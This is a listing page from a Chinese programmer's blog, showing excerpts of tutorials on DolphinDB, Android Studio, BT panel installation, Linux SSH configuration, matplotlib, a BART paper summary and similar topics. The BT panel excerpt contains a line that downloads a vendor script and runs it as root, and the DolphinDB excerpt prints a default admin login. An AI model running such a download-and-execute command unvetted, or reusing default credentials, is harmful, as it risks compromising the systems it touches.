<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c45a321e6b13bd745f291de251cedd0/" rel="bookmark">
			Windows安装DolphinDB，配置单节点启动与GUI
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1. 安装Java 首先，进入网址：jdk11
下载jdk-11.0.20_windows-x64_bin.exe，然后安装即可
安装完成后，打开命令提示符，输入：
java javac 如果这两个命令都出现一大堆东西，而不是找不到指令的提示的话，java安装成功
2. 下载并解压 首先，进入官网下载社区版的DolphinDB：https://www.dolphindb.cn/product#downloads下载后直接解压解压的文件夹内有server/dolphindb.exe，这个文件可以直接运行，即可启动单节点，单节点启动成功后会出现一个命令行弹窗与&gt;符号，证明启动成功 （可选）自定义启动配置 系统默认启动端口号是8848，如果希望在其他端口启动（如8900），运行：
dolphindb.exe -localSite localhost:8900:local8900 或是修改server/dolphindb.cfg文件
更多启动命令/参数请参考：https://gitee.com/dolphindb/Tutorials_CN/blob/master/standalone_server.md
GUI界面 同时，官方也提供了GUI界面，就在上面下载社区版往下滑动网页就可以看到
相关详情请参考：https://www.bilibili.com/video/BV1bz4y167Ey/
格外注意，在GUI中运行增删改查的操作前需要先登录：
login("admin","123456") 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c496215b3b553a1b126078c1ac130a39/" rel="bookmark">
			Android学习（一）：Android Studio安装与配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android学习（一）：Android Studio安装与配置 一、安装 下载地址
下载zip文件，免安装。
二、下载资源 启动后，出现该弹框，点击Cancel。
点击Next
默认，点击Next。
点击Next。
点击Finish
开始下载所需资源
下载完成，点击Finish
欢迎页面
三、移动sdk路径 找到sdk的原始路径
将其移动到新路径
重新启动Android Studio，发现无法找到SDK
将Android SDK Location更改为最新的路径，点击Next。
点击Finish
点击Finish
进入欢迎页面
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6741a3309eaa43feac2632fc386400d0/" rel="bookmark">
			优化IP地址管理：实现高效、智能的IP资源监控与分配
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在当今高度信息化的时代，IP地址管理已成为企业网络运营的核心环节。为了更好地应对不断增长的网络设备和应用需求，提高企业运营效率，监控易推出的IP地址管理工具，将助力企业实现更高效、更智能的IP地址监控与分配。
一、IP地址概览：全面掌握IP地址使用情况
监控易支持IP地址概览页展示IP地址使用报告，包括IP使用概览、IP地址冲突记录、子网IP使用占比TOP10、子网IP使用占比TOP10等。用户可以一目了然地查看IP地址的使用情况，及时发现并解决IP地址冲突问题。同时，通过对子网IP使用占比的分析，用户可以优化网络结构，提高网络性能。
二、灵活的IP地址管理：实现精细化控制与操作
监控易支持添加网络、网段、IP地址，可以展示IP地址与MAC地址的对应关系，方便用户对IP地址进行精细化管理和控制。用户可以查看在用、未用的地址，以及地址的分配、保留状况。此外，用户还可以通过IP地址状态浏览功能，了解IP地址的分配状态和使用状态。
三、分组管理：高效管理IP子网
监控易支持创建分组，便于管理IP子网。用户可以在某分组下创建/修改/删除子分组，系统还预置了默认分组。这种分组管理方式可以帮助用户更好地组织和管理网络资源，提高管理效率。
四、自动扫描与告警：全面监控与预警
监控易使用自动扫描IP地址功能时，系统会根据设置的扫描规则自动扫描网络中的IP网段、IP地址，扫描到的新IP网段、IP地址将被添加到系统中。同时，监控易还支持子网阈值告警、DHCP阈值告警、IP地址异常告警等功能。这些功能可以帮助用户及时发现并处理网络中的异常情况，确保网络的稳定性和可用性。
五、DHCP管理：实现自动化与智能化
监控易支持添加DHCP服务器，可以扫描DHCP数据，并对IP地址自动分配、IP信息自动更新状况进行监测。通过DHCP管理功能，用户可以有效地管理和控制IP地址的分配过程，提高网络管理的智能化程度和自动化水平。
六、报表分析：深入挖掘数据价值
监控易支持IP地址报告，可创建IP状态统计报表、子网统计报表、DHCP地址租约报表、IP变更记录报表、IP异常记录报表等。这些报表可以帮助用户深入挖掘数据价值，全面了解网络流量趋势和业务运行情况。通过分析报表数据，用户可以及时调整网络策略和优化网络结构，提升企业运营效益和竞争力。
总结：监控易作为一款全新的IP地址管理工具，具有全面的IP地址监控功能和灵活的分组管理功能。通过实时掌握IP地址使用情况、实现精细化控制与操作、高效的分组管理、自动扫描与告警等功能，以及强大的报表分析能力，监控易将助力企业实现更高效、更智能的IP地址监控与分配。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5dabf08457e089e9f27acdc95613f11c/" rel="bookmark">
			阿里云服务器linux安装宝塔面板
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		阿里云服务器linux安装宝塔面板 1 背景1.1 阿里云1.2 Linux1.3 Linux连接工具1.4 Linux 管理操作面板 2 安装FinalShell工具3 安装宝塔面板4 配置安全组 1 背景 1.1 阿里云 阿里云服务器是阿里云提供的一项云计算服务，它能够帮助用户快速搭建网站、应用和服务，提供高效稳定的数据存储和计算能力，满足用户的各种业务需求。
阿里云服务器是一种简单高效、处理能力可弹性伸缩的计算服务。它提供了多种规格的服务器，包括弹性计算型、计算型、内存计算型、GPU计算型和神舟系列服务器等，能够满足不同用户的需求。用户可以根据自己的业务需求选择合适的服务器规格。
阿里云服务器提供了高效稳定的数据存储和计算能力，用户可以通过API接口进行服务器的管理和控制，非常方便。此外，它还提供了丰富的监控和日志功能，方便用户进行故障排查和性能优化。
阿里云服务器还提供了多种计费模式，包括按需付费、包年包月、长期包、预留实例等，用户可以根据自己的业务需求选择合适的计费模式。
小结：阿里云服务器是一款功能强大、稳定可靠的云计算服务，它能够帮助用户快速搭建网站、应用和服务，提供高效稳定的数据存储和计算能力，满足用户的各种业务需求。
1.2 Linux Linux是一套免费使用和自由传播的类Unix操作系统，它是由林纳斯·本纳第克特·托瓦兹（Linus Benedict Torvalds）于1991年首次发布的。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。Linux有上百种不同的发行版，如基于社区开发的debian、archlinux，和基于商业开发的Red Hat Enterprise Linux、SUSE、Oracle Linux等。
1.3 Linux连接工具 下面是一些常用的Linux连接工具，但具体的选择和使用取决于具体的场景和需求。
SSH（Secure Shell）：SSH是一种安全的网络协议，用于在远程计算机上执行命令和传输文件。在Linux中，可以使用SSH客户端连接到远程服务器，进行远程管理、文件传输等操作。Telnet：Telnet是一种基于TCP协议的网络协议，用于在远程计算机上执行命令。在Linux中，可以使用Telnet客户端连接到远程服务器，进行远程管理、文件传输等操作。FTP（File Transfer Protocol）：FTP是一种用于在网络上进行文件传输的标准协议。在Linux中，可以使用FTP客户端连接到远程服务器，进行文件的上传和下载操作。SCP（Secure Copy）：SCP是一种在Linux中用于在本地主机和远程主机之间安全地复制文件的协议。它使用SSH协议进行身份验证和加密传输。
rsync：rsync是一个命令行实用程序，可以在本地和远程系统之间同步和备份文件。它支持基于SSH的远程连接，也支持本地文件系统。 1.4 Linux 管理操作面板 Webmin：Webmin是一款开源的Web界面管理工具，可以在浏览器中远程管理Linux系统。它提供了丰富的系统管理功能，包括文件管理、软件包管理、用户管理、网络配置等。ZPanel：ZPanel是一款开源的面板系统，支持多种Linux发行版，包括CentOS、Ubuntu等。它提供了简单的图形界面，用于配置和管理电子邮件服务、网站服务器、数据库等。cPanel：cPanel是一款商业的托管控制面板，主要用于Linux主机托管服务。它提供了一整套强大的网站和服务器管理工具，包括文件管理、域名管理、电子邮件管理、数据库管理等。Plesk：Plesk是一款类似cPanel的托管控制面板，提供了丰富的网站和服务器管理工具，包括Web主机、域名管理、电子邮件服务、数据库管理等。Plesk还支持多种应用软件的安装和管理。ISPConfig：ISPConfig是一款开源的多语言控制面板，支持多种Linux发行版。它提供了一整套网站和服务器管理工具，包括Web主机、域名管理、电子邮件服务、数据库管理等。ISPConfig还支持插件扩展功能，可以方便地添加新的管理功能。 2 安装FinalShell工具 FinalSehll官网
1、在官网进行下载，安装
2、在弹出框中输入需要的信息
3 安装宝塔面板 1、打开官网：宝塔官网
找到自己的系统安装命令
2、我这里是Ubuntu，因此是下面的命令
wget -O install.sh https://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh ed8484bec 3、输入到 findshell
4、这里时间会久一些，安装成功后，会显示一下信息：
5、宝塔命令地址和账号密码
账号密码可以不用记住
如果忘记密码，可以输入
bt default 根据连接打开输入账号密码
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5dabf08457e089e9f27acdc95613f11c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f0c963c03398d3d8dc8404591c05dd7/" rel="bookmark">
			【开源】基于JAVA&#43;Vue&#43;SpringBoot的无代码动态表单系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、摘要1.1 项目介绍1.2 项目录屏 二、功能模块2.1 动态类型模块2.2 动态文件模块2.3 动态字段模块2.4 动态值模块 三、系统设计3.1 用例设计3.2 数据库设计3.2.1 动态类型表3.2.2 动态文件表3.2.3 动态字段表3.2.4 动态值表 四、系统展示五、核心代码5.1 查询档案类型5.2 新增档案类型5.3 删除档案子项5.4 编辑档案额外字段5.5 添加档案额外字段 六、免责说明 一、摘要 1.1 项目介绍 基于Vue+SpringBoot+MySQL的无代码平台的表单平台，包括了系统数据中心模块，用来存放管理系统通用的模块，另外分别设计了动态类型模块、动态文件模块、动态字段模块和动态值模块这四大模块，用于实现档案管理系统的核心表单逻辑。
1.2 项目录屏 二、功能模块 本文设计的无代码平台的表单系统的包括了系统数据中心模块，用来存放管理系统通用的模块，另外分别设计了动态类型模块、动态文件模块、动态字段模块和动态值模块这四大模块，用于实现档案管理系统的核心表单逻辑。
2.1 动态类型模块 动态表单类型是灵活的类型，允许自定义表单字段，根据业务情况，表格收集的信息可能会有所不同，动态表单类型允许根据业务需求自由添加、修改或删除表单字段，以满足特定业务需求。动态表单类型可以根据用户的操作和需求，自愿设置输入框、选项等特定页签，提高用户填写表单的效率和体验，采用动态表单类型使管理员更容易管理表单，只需在后台进行相关设置，即可轻松修改、删除或添加表单，提高管理效率。使用动态表单类型可以帮助您避免由于不断变化的业务需求而频繁更改代码，降低软件开发成本，并节省时间和资源，动态表单类型在数据收集、表单管理和开发成本方面具有重要意义，通过采用动态表单类型，可以快速灵活地响应各种业务场景的表单需求，提高用户体验和管理效率。
2.2 动态文件模块 动态文件模块是一种无代码平台表单系统钟，用于显示用户发布的图像、视频和动态信息等文件的模块，动态文件模块让用户更直观地了解感兴趣的人的最新动向，在动态文件模块中，用户可以看到表单的动态内容，以增加用户使用该平台的兴趣和满意度，动态文件模块支持不同类型的文件上传，如照片、视频、音频等，为用户提供更丰富的内容表示，通过动态文件模块，用户可以轻松地分享他们的生活、知识和经验，吸引更多用户的兴趣和参与。用户可以将自己的照片、视频等文件直接上传到动态文件模块，动态文件模块便于用户之间的通信和交互。通过动态文件模块，可以增强用户体验，丰富内容表达，方便文件管理和共享，增强平台的交互性，吸引更多用户加入平台。它可以增加用户的活动性和参与度。
2.3 动态字段模块 动态字段模块是用于在信息管理系统中动态添加、删除或更改字段的模块，随着市场和商业环境的变化，公司必须不断调整其信息管理系统，以满足新的业务需求。动态字段模块可以满足这一需求，使公司能够灵活地添加、删除或更改字段，以跟上业务变化，动态字段模块可帮助公司更好地管理数据，避免数据重复或关键信息丢失，并提高数据的准确性和质量，动态字段模块支持快速添加新字段，这将使组织拥有更多的数据维度和更丰富的数据信息，提高其数据分析能力，并更好地支持其决策，动态字段模块简化了信息管理系统的开发和维护过程，减少了手动工作和编码，并降低了开发和维护成本。动态字段模块对于信息管理系统来说是非常必要的，通过动态字段模块，企业可以灵活地添加、删除或更改字段，以满足不断变化的业务需求，同时提高数据的准确性和质量，增强数据分析能力，改进系统开发和维护，简化活动流程，带来更多业务价值。
2.4 动态值模块 动态值模块是用于记录和管理用户行为以及动态变化数据的软件和应用程序，动态值模块可以记录和反映用户在平台上的活动，如文件的具体字段内容等，可以直观地表达用户的行为和态度，动态值模块分析用户行为，以了解用户的兴趣和需求，并向平台推荐更准确的内容和服务，动态值模块可以深入分析用户行为数据，提取用户需求和痛点，帮助平台制定更准确的产品策略，提高用户满意度，动态值模块为平台运营和决策提供有价值的数据支持，优化运营策略，提高市场竞争力。
三、系统设计 3.1 用例设计 3.2 数据库设计 3.2.1 动态类型表 3.2.2 动态文件表 3.2.3 动态字段表 3.2.4 动态值表 四、系统展示 五、核心代码 5.1 查询档案类型 @ApiOperation(value = "查询档案类型") public List&lt;ArCommonArchive&gt; getByParentIdInTree(String parentId,Boolean openDataFilter) { List&lt;ArCommonArchive&gt; list = new ArrayList&lt;&gt;(); QueryWrapper&lt;ArCommonArchive&gt; qw = new QueryWrapper&lt;&gt;(); qw.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0f0c963c03398d3d8dc8404591c05dd7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a3db2e0557bf51746a28108d9e9193e/" rel="bookmark">
			uniapp vue2 车牌号输入组件记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		uniapp vue2 车牌号输入案例记录 组件如图
直接上代码
1.html
&lt;template&gt; &lt;view&gt; &lt;view class="plate" :class="{'show': show}"&gt; &lt;view class="itemFirst flex-d"&gt; &lt;view class="item item1" @click="handleChange(0)"&gt; {{ plateNumber[0] || '' }} &lt;/view&gt; &lt;view class="item item1" @click="handleChange(1)"&gt;{{ plateNumber[1] }}&lt;/view&gt; &lt;/view&gt; &lt;view class="point"&gt;●&lt;/view&gt; &lt;view class="item" :class="{'active': index === 2}" @click="handleChange(2)"&gt;{{ plateNumber[2] }}&lt;/view&gt; &lt;view class="item" :class="{'active': index === 3}" @click="handleChange(3)"&gt;{{ plateNumber[3] }}&lt;/view&gt; &lt;view class="item" :class="{'active': index === 4}" @click="handleChange(4)"&gt;{{ plateNumber[4] }}&lt;/view&gt; &lt;view class="item" :class="{'active': index === 5}" @click="handleChange(5)"&gt;{{ plateNumber[5] }}&lt;/view&gt; &lt;view class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5a3db2e0557bf51746a28108d9e9193e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89dc22136aaf03e6cf38adc4fd0c276a/" rel="bookmark">
			编程语言的发展趋势和未来方向
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、编程语言的未来？ 随着科技的飞速发展，编程语言在计算机领域中扮演着至关重要的角色。它们是软件开发的核心，为程序员提供了与机器沟通的桥梁。那么，在技术不断进步的未来，编程语言的走向又将如何呢？
方向一：编程语言的发展趋势
未来编程语言的发展特点趋势是更安全、人性化（可读性、可写性）、跨平台这三个方向进行发展。更加简单易学更加多样性，有更加专业面向某一领域的语言，也会更加通用，对初学者友好。具有良好的模块化特性，能够更好地组织和管理代码，能够更好地适应不同的开发需求和场景，提高代码的可读性和可维护性。具有良好的并发性，这意味着能够更好地支持多线程编程，提高程序的并发能力和性能。
编程语言的趋势：
数据科学和机器学习 云计算和大数据 区块链和加密货币 Web开发和移动应用开发 嵌入式系统和物联网 人工智能和深度学习 编程语言的发展离不开计算机领域其他技术的发展。编程语言发展至今，特性的互相借鉴的情况越来越普遍，语言生态互通也更常见（如直接兼容，或者 Bridging 技术），编译型和解释型界限也越来越模糊（比如 Dart 既能编译运行也能解释运行，还能边解释运行边编译），语言之间的性能差异也越来越小（V8 引擎，JIT，硬件性能提高），语言之间的互相转换也开始普遍。
编程语言的未来将是一个充满机遇和挑战的领域。虽然新语言在诞生，但我们也不能忽视每个编程语言都在不断的发展和变化，期待编程语言不断发展为开发人员提供更加强大和灵活的工具，以应对不断变化的技术需求。
2、编程语言的多样性
编程语言的多样性是其生命力的关键。未来的语言不仅需要在语法上更加清晰，还应该在跨平台性和互操作性上进行革新。一种可能的情景是，各种编程语言将通过统一的标准或协议实现更顺畅的交互和集成，这将允许开发者根据实际需要选择最适合的工具。
多样性是编程领域的一大特色，不同的语言针对不同的应用场景。随着计算设备的日益普及，未来的编程语言预计会诞生更多专门化的分支，满足物联网、边缘计算、量子计算等新兴领域的特定需求。同时，互操作性、可移植性和跨平台性将成为衡量编程语言成功与否的重要标准。多语言运行时和语言桥梁技术的发展，将使得不同语言之间的界限越来越模糊。
3、编程语言与人工智能的融合
未来编程语言有望更加智能化，通过引入自然语言处理和机器学习技术，使得代码的编写和理解更加自然和智能。这将大大提高开发效率，降低学习成本。
支持人工智能应用的发展： 编程语言将更好地支持人工智能应用的开发，提供更丰富的库和工具，使得开发者能够更轻松地构建和部署复杂的人工智能系统。
4、编程语言的教育和普及
随着编程的重要性日益凸显，未来编程教育将更加注重逻辑思维和创造力的培养。不仅是计算机专业，编程也将成为通识教育的一部分。在线教育平台和交互式学习工具的发展，将使得编程学习更加容易和普及。此外，从游戏化教学到虚拟现实编程环境，未来的编程教育将变得更加直观和吸引人。
5、编程语言的生态系统和工具
良好的生态系统和强大的工具集是编程语言成功的关键。在未来，随着云计算和DevOps文化的普及，便捷的云端开发环境、自动化的测试框架、智能化的代码审查工具和更加先进的版本控制系统将成为标配。编程语言的生态系统将不断丰富，以支持更快的迭代和更高质量的软件开发。同时，随着开源文化的发展，社区驱动的项目将成为编程语言生态发展不可或缺的一部分。
总结：
在我探索编程世界的旅程中，我深刻地认识到，编程不仅仅是一种技术， 是一种思维方式， 一种解决问题的方法。希望通过分享我的编程学习体验，能够启发更多的人看到编程的魅力和价值。
我对编程的看法是复杂的,但同时也是充满热情的。我认为编程是一种强大的工具, 是一种可以改变世界、解决问题、创新和进步的工具。同时，我也认识到编程的挑战和困难，但我相只要有足够的努力和实践，我就能克服这些困难。
在学习的初期，我遇到了很多困难。编程语言中的复杂语法和抽象的概念往往令人困感。然而,我逐渐认识到，这些困难实际上学习编程的一部分,让我们不断提升和挑战自己的动力。随着时间的推移，我逐渐掌握了编程的基本概念和技能。我开始能够用代码创造出一些简单的程序，这让我感到非常兴奋。但是,我也意识到，编程不仅仅是编写代码，更是一种全面的思考方式。我也明白了编程中的困难和挑战是常态,酶次克服困难和挑战都会让我成长和进步。当我遇到问题时，我会尝试用编程的思维式去分析和解决它，这让我在生活中变得更加有条理和高效。
学习编程使我认识到，问题可以有多种解决方案,而不仅仅是单一的答案。 这使我更愿意尝试新的方法，勇于挑战自我。同时，编程也培养了我的逻辑思维和解决问题的能力。在面对问题时,我学会了分析问题，寻找解决方案的思维方式。此外，编程还让我更好地理解了团队合作的重要性。在项目中，我们需要与团队成员紧密合作，共同解决问题。这种经历使我学会了如何有效地与他人沟通，如何尊重他人的观点和想法。
回顾我的学习过程，我认为编程给予我最大的收获是解决问题的能力。在编程中,我们经常面临各种各样的问题和挑战,要寻找解决方案。通过这个过程，我学会了如何分析问题、找解决方案，钚断尝试和改进。我相信，这种能力在生活的其他方面同样重要。
总之，学习编程让我学会了如何思考问题、解决问题，翔让我意识到，只要有足够的毅力和耐心，没有什么问题是无法解决的。我相信,这种编程思维方式和解决问题的能力将会对我未来的学习和生活产生深远的影响。学习编程不仅是一种技能，更是一种思维方式， 一种解决问题的方法。我希望通过分享我的体验,能够启发更多的人看到编程的魅力和价值，让我们一起用编程改变世界。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f47c03842a092c671936dbf005b00e2/" rel="bookmark">
			lotus-farcaster 搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		lotus 开源监控仪表盘 安装修改配置文件监听钱包地址指定安装目录可以修改脚本指定miner配置文件路径执行安装脚本 修改修改端口为9200修改安装脚本 9100改为9200，重新安装修改检查脚本 端口 9200，重新安装 安装成功prometheus 安装创建存储目录 配置文件添加 prometheus-node-exporter热加载配置文件grafana参考 安装 # cat /etc/issue Ubuntu 20.04.6 LTS \n \l git clone https://github.com/s0nik42/lotus-farcaster.git cd lotus-farcaster/lotus-exporter-farcaster/ 修改配置文件 cp config.toml.example config.toml miner_api = "miner_api" markets_api = "miner_api" daemon_api = "lotus_api" boost_api = "" boost_graphql = "http://127.0.0.1:8080/graphql/query" markets_type = "boost" GraphQL APIboost_api boostd auth api-info --perm admin 监听钱包地址 cp addresses.toml.example addresses.toml 指定安装目录 创建安装目录 mkdir /backup/lotus-exporter-farcaster 可以修改脚本指定miner配置文件路径 elif [ ! -f "$IUSER_HOME/.lotusminer/config.toml" ] 执行安装脚本 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4f47c03842a092c671936dbf005b00e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32efbd6f01f8b9afceb9d82b73f98aeb/" rel="bookmark">
			python画图工具总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、python工具 python运行工具：Anaconda3
Anaconda3运行模式：jupyter notebook
操作系统：window11
二、折线图 from matplotlib import pyplot import matplotlib.pyplot as plt from math import sqrt import pandas as pd from matplotlib.pyplot import MultipleLocator plt.figure(figsize=(10,5)) x = [] actual = [1, 2, 3, 4, 5, 6, 7, 8] for i in range(1,len(actual)+1): x.append(i) print(x) plt.plot(x,[1,2,3,4,5,6,7,8],'b',marker='o',ms=10,label="lable1") plt.plot(x,[4,2,4,5,7,8,1,5],'r', marker='v',ms=12,label="lable2") x_major_locator=MultipleLocator(1) y_major_locator=MultipleLocator(1) #plt.plot(actual,label="actual") #plt.xticks(rotation=20) #plt.title('35',fontsize=20) plt.xlabel("x",fontsize=20) plt.ylabel("y",fontsize=20) ax=plt.gca() ax.xaxis.set_major_locator(x_major_locator) #把x轴的主刻度设置为1的倍数 ax.yaxis.set_major_locator(y_major_locator) #设置坐标字体大小 plt.tick_params(labelsize=20) #['WaveNet_Multihead_CNN', 'Multihead_CNN','actual'] plt.legend(loc='upper left',framealpha=0.0,fontsize=20) plt.grid(linestyle='-.') pyplot.tight_layout() #plt.savefig("path/图片名.svg") plt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/32efbd6f01f8b9afceb9d82b73f98aeb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d203c2aabc3eaf6dfe8264405d5dded/" rel="bookmark">
			Linux 常见服务配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		笔记所以内容很多，建议选择性看看
SSH Secure Shell 用于与服务器建立安全的连接
对应服务 sshd
注意：配置文件 配制文件修改需要重启或重载sshd服务才能生效
systemctl sshd reload # 重载 sshd 配置文件 systemctl sshd restart # 重启 sshd 服务 客户端配置文件 man ssh_config 可以查看对应说明文档，一般无需更改 /etc/ssh/ssh_config OpenSSH SSH client configuration files ~/.ssh/known_hosts 记录了登录过的IP和指纹 ~/.ssh/config 针对用户的SSH配置 ~/.ssh/authorized_keys 记录公钥，用于允许记录公钥的服务器通过指定用户免密登录 服务端配置文件 man sshd_config 可以查看对应说明文档 /etc/ssh/sshd_config OpenSSH SSH daemon configuration file 主要配置： Port 22 可以自定义sshd服务端口 ListenAddress 0.0.0.0 定义sshd监听 PermitRootLogin no 是否允许root登录，默认允许 Banner /etc/motd 登录后的提示信息 UseDNS no 禁用DNS解析，ssh连接会快很多 UsePAM yes 加载PAM模块用于用户认证 登录方式 ssh remote_user@ip -p port # 登录远程的用户，仅IP是用当前用户，不带端口默认22 ssh -t -o "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6d203c2aabc3eaf6dfe8264405d5dded/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3f595baf52e6761f89efb2d964ef2ab/" rel="bookmark">
			BART论文解读：BERT和GPT结合起来会发生什么？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		BART:Denoising Sequence-to-Sequence Pre-training for Natural Language Generation, Translation, and Comprehension 主要工作 提出了BART (Bidirectional and Auto-Regressive Transformers)， 是一种用于自然语言生成、翻译和理解的序列到序列的预训练方法。它通过先用任意噪声函数损坏文本，然后学习一个模型来重构原始文本来进行训练。BART使用标准的基于Transformer的神经机器翻译架构，结合了BERT的双向编码器和GPT的从左到右解码器的特点。
研究发现，BART在文本生成任务中表现尤为出色，同时也适用于理解任务。它在GLUE和SQuAD任务中与RoBERTa表现相当，并在一系列抽象的对话、问答和摘要任务中取得了新的最先进结果，显示出高达6 ROUGE的增益。此外，BART还在机器翻译任务中表现出色，比只使用目标语言进行预训练的反向翻译系统提高了1.1 BLEU分。
图 1：BART 与 BERT和的示意性比较。
模型 BART 是一个去噪自编码器，它将受损的文档映射回其来源的原始文档。这个模型以序列到序列的形式实现，具有对受损文本的双向编码器和一个从左到右的自回归解码器。在预训练阶段，我们优化原始文档的负对数似然。
架构 BART 使用了标准的序列到序列变换器（Transformer）架构，但是有所改动。继承自GPT的一个修改是，它将ReLU激活函数替换为GeLUs（Hendrycks &amp; Gimpel, 2016），并且将参数初始化为N(0, 0.02)。在我们的基础模型中，编码器和解码器各使用了6层，而在我们的大型模型中，每个部分各使用了12层。这种架构与BERT使用的架构密切相关，但存在以下差异：（1）解码器的每一层还会对编码器的最后一个隐藏层进行交叉关注（如在Tansformer sequence-to-sequence模型中所做的那样）；以及（2）BERT在单词预测前使用了一个额外的前馈网络，而BART没有使用。总体而言，BART比同等大小的BERT模型包含大约多10%的参数。
预训练 BART 通过破坏文档然后优化重建损失来进行训练，重建损失是解码器输出和原始文档之间的交叉熵。不同于现有的针对特定噪声方案定制的去噪自编码器，BART 允许我们应用任何类型的文档破坏方式。在极端情况下，即源信息完全丢失时，BART 相当于一个语言模型。
我们试验了几种先前提出的和新颖的转换方法，但我们认为开发其他新的替代方案仍有重大潜力。我们使用的转换方法在下面进行了总结，示例显示在图2中。
图 2：我们实验的输入噪声的转换。这些变换可以组合起来。
Token Masking（令牌遮蔽）
遵循BERT（Devlin等人，2019年）的方法，随机采样令牌并将其替换为[MASK]元素。
Token Deletion（令牌删除）
从输入中随机删除令牌。与令牌遮蔽不同，模型必须决定哪些位置缺少输入。
Text Infilling（文本填充）
采样一定数量的文本跨度（span），这些跨度的长度根据泊松分布（λ=3）确定。每个跨度被单个[MASK]令牌替换。0长度的跨度对应于插入[MASK]令牌。文本填充的灵感来自SpanBERT（Joshi等人，2019年），但SpanBERT采样不同的分布来确定跨度长度，并用长度完全相同的一系列[MASK]令牌替换每个跨度。文本填充教会模型预测每个跨度中缺少多少个令牌。
Sentence Permutation（句子置换）
将文档分割为基于句号的句子，并将这些句子随机打乱顺序。
Document Rotation（文档旋转）
均匀随机选择一个令牌，并旋转文档，使其从该令牌开始。这项任务训练模型识别文档的开始部分。
微调 BART 生成的表示可以通过多种方式用于下游应用程序。
图 3：微调 BART 以进行分类和翻译。
序列分类任务
对于序列分类任务，相同的输入被送入编码器和解码器，最后一个解码器令牌的最终隐藏状态被送入一个新的多类别分类器。这种方法与BERT中的CLS令牌有关，但我们在末尾增加了一个额外的令牌，使得解码器可以关注完整输入的解码器状态（见图3a）。
Tokens分类任务
对于令牌分类任务，例如SQuAD的答案端点分类，我们将完整的文档送入编码器和解码器，并使用解码器顶层的隐藏状态作为每个词的表征。这个表征被用来对令牌进行分类。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e3f595baf52e6761f89efb2d964ef2ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9c19692fbecfe4093a4d71b5fa81c8e/" rel="bookmark">
			提前终止 Lambda forEach 的两种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Java中，Lambda表达式提供了一种简便的方式来对集合进行迭代处理。然而，有时我们可能希望在特定条件下提前终止forEach的执行。这篇博客将介绍两种实现这一目标的方法。
